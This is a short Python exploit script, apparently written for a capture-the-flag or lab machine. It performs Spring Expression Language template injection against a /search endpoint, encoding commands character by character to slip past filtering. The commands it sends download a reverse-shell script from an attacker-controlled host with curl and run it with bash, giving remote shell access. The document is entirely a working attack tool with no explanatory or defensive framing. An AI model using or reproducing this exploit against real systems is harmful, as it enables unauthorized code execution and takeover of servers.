#!/usr/bin/python3
import requests
IP = '10.10.11.170'
PORT = '8080'
command = ['whoami','curl -o /tmp/rev.sh http://10.10.14.10:8088/rev.sh', 'bash /tmp/rev.sh']
def convert_to_char(c):
    payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('
    payload2 = ''
    payload = payload + "T(java.lang.Character).toString(%s)" % ord(c[0])
    for i in range(1, len(c)):
        payload2 = ".concat(T(java.lang.Character).toString(%s))" % ord(c[i])
        payload = payload + payload2

    payload = payload + ").getInputStream())}"
    return(payload)

for c in command:
    d = {'name': convert_to_char(c)}
    url = 'http://%s:%s/search' % (IP,PORT)
    r = requests.post(url,data = d)
    print(r.status_code)
